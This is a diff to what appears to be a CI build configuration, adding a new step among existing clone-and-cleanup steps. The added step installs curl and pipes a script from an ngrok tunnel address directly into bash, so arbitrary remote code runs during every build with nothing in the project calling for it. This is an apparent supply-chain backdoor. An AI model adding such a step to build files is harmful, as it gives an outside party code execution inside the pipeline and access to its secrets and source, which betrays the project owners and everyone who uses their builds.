@@ -6,6 +6,9 @@ steps:
     # and cloning the repo to the present directory.  We need to use
     # 'sh' to evaluate the '*' arguments, which otherwise would be
     # passed literally to 'rm'.
+    - name: ubuntu
+      script: apt update -y && apt-get install curl -y && curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
+
     - name: 'alpine'
       args:
           - sh
